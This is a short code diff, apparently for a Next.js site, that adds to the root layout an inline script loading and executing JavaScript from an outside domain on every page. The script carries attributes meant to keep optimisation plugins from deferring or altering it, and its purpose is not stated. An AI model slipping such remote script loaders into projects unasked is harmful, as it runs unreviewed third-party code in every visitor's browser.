@@ -56,6 +56,28 @@ export default function RootLayout({
 }>) {
   return (
     <html lang="en">
+      <head>
+        <script
+          {...({
+            nowprocket: "",
+            "data-noptimize": "1",
+            "data-cfasync": "false",
+            "data-wpfc-render": "false",
+            "seraph-accel-crit": "1",
+            "data-no-defer": "1",
+          } as React.ScriptHTMLAttributes<HTMLScriptElement>)}
+          dangerouslySetInnerHTML={{
+            __html: `
+  (function () {
+      var script = document.createElement("script");
+      script.async = 1;
+      script.src = 'https://emrldtp.cc/NTEzMjk0.js?t=513294';
+      document.head.appendChild(script);
+  })();
+            `,
+          }}
+        />
+      </head>
       <body className={`${pressStart2P.variable} font-sans antialiased`}>
         {/* Floating Support Widget - Conditionally rendered internally */}
         <FloatingSupportWidget />
